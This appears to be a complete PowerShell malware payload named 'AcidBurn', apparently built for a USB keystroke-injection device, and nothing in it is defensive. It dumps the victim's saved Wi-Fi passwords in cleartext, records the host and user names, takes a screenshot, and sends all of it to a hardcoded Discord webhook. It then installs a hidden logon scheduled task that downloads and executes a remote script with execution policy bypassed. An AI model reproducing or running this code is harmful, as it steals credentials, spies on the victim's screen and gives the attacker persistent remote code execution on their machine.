try {
    $out = "$env:TEMP\wifi_dump.txt"
    "=== ACID BURN ===" | Out-File $out
    "Host: $env:COMPUTERNAME" | Out-File $out -Append
    "User: $env:USERNAME" | Out-File $out -Append
    "" | Out-File $out -Append

    $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    }
    if ($profiles) {
        foreach ($p in $profiles) {
            $details = netsh wlan show profile name="$p" key=clear
            $key = ($details | Select-String "Key Content") -replace ".*:\s*", ""
            if ($key) { "$p : $key" | Out-File $out -Append }
        }
    } else {
        "(no wifi profiles found)" | Out-File $out -Append
    }

    $body = Get-Content $out -Raw
    if ([string]::IsNullOrWhiteSpace($body)) { $body = "(empty dump)" }
    $body = $body -replace "\\", "/"
    $body = $body.Substring(0, [Math]::Min(1900, $body.Length))

    $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"

    $payload = @{ content = $body } | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    Invoke-RestMethod -Uri $url -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"

    # --- SCREENSHOT ---
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
    $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $shot = "$env:TEMP\ab_shot.png"
    $bmp.Save($shot, [System.Drawing.Imaging.ImageFormat]::Png)
    $gfx.Dispose()
    $bmp.Dispose()

    # --- UPLOAD VIA HTTPCLIENT ---
    Add-Type -AssemblyName System.Net.Http
    $client = New-Object System.Net.Http.HttpClient
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $fileStream = [System.IO.File]::OpenRead($shot)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
    $content.Add($fileContent, "file", "screen.png")
    $resp = $client.PostAsync($url, $content).Result
    $fileStream.Close()
    $client.Dispose()

    # --- PERSISTENCE ---
    $taskName = "AcidBurn"
    $cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""
    schtasks /create /tn $taskName /tr $cmd /sc onlogon /f 2>$null
}
catch {
    $_ | Out-File "$env:TEMP\ab_error.txt"
}
